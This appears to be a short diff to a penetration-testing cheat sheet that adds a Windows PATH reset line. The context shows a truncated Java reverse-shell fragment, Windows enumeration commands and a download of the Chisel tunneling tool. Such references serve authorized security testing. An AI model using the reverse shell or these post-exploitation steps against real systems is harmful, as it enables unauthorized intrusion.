@@ -397,6 +397,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 ##### PATH issues on Windows
 > 1. ```c:\windows\system32\whoami.exe```
 > 1. ```c:\windows\system32\ipconfig.exe```
+> 1. ```set PATH=%SystemRoot%\system32;%SystemRoot%;```
 	
 ##### Chisel
 > 1. Download ```git clone https://github.com/jpillora/chisel.git```
